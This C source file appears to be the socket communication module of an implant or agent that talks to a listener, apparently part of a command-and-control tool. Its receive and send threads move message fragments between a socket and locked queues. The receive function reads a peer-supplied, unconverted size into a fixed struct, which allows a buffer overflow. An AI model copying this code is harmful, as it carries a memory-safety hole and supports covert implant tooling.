#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>

#include <sys/socket.h>
#include <arpa/inet.h>

#include "utility.h"
#include "implant.h"
#include "queue.h"
#include "agent_comms.h"

// Global variables
// Receive Queue
extern struct Queue* agent_receive_queue;
extern pthread_mutex_t agent_receive_queue_lock;
// Send Queue
extern struct Queue* agent_send_queue;
extern pthread_mutex_t agent_send_queue_lock;
// Alarm flag
extern volatile sig_atomic_t agent_alive_flag;
// SIGINT flags
extern volatile sig_atomic_t agent_close_flag;

STATIC int agent_receive(int *sockfd, int *next_read_size){
	Fragment fragment;
	
	// get first chunk which contains total message size
	int nbytes = recv(*sockfd, (void*)&fragment, HEADER_SIZE + *next_read_size, 0);
	if (nbytes <= 0){
		if (nbytes == 0){
			debug_print("%s\n", "connection closed");
			// this is not an error, but we need to close down. 
			// TODO put a new return value that restarts connection to listener.
			return RET_ERROR;
		}
		else {
			printf("recv error\n");
			return RET_ERROR;
		}
	}
	
	debug_print("received fragment: type: %d, index: %d, total_size: %d, next_size: %d\n", \
		ntohl(fragment.header.type), \
		ntohl(fragment.header.index), \
		ntohl(fragment.header.total_size), \
		ntohl(fragment.header.next_size));

	*next_read_size = fragment.header.next_size;

	Queue_Message* message = malloc(sizeof(Queue_Message));
	message->fragment = calloc(1, nbytes + 1);
	message->id = -1;
	message->size = nbytes;
	memcpy(message->fragment, &fragment, nbytes);
	
	enqueue(agent_receive_queue, &agent_receive_queue_lock, message);

	return 0;	
}

int agent_send(int *sockfd){
	Queue_Message* message;

	if (!(message = dequeue(agent_send_queue, &agent_send_queue_lock))) return RET_OK;
	
	debug_print("sending fragment: type: %d, index: %d, size: %d\n", ntohl(message->fragment->type), ntohl(message->fragment->index), ntohl(message->fragment->first_payload.total_size));
	
	if (sendall(*sockfd, message->fragment, message->size) == RET_ERROR){
		printf("Send error\n");
		return RET_ERROR;
	}
	
	free(message->fragment);
	free(message);

	return 0;	
}

void *agent_receive_thread(void *vargp){
	int *sockfd = (int*)vargp;
	int next_read_size = 0;

	while(!agent_close_flag){
		if (agent_receive(sockfd, &next_read_size) != RET_OK){
			agent_close_flag = true;
		}
	}
	debug_print("%s\n", "listener_receive_thread done");
	return 0;
}

void *agent_send_thread(void *vargp){
	int *sockfd = (int*)vargp;

	while(!agent_close_flag){
		if (agent_send(sockfd) != RET_OK){
			agent_close_flag = true;
			printf("listener_send_thread error\n");
		}
	}
	debug_print("%s\n", "listener_send_thread done");
	return 0;
}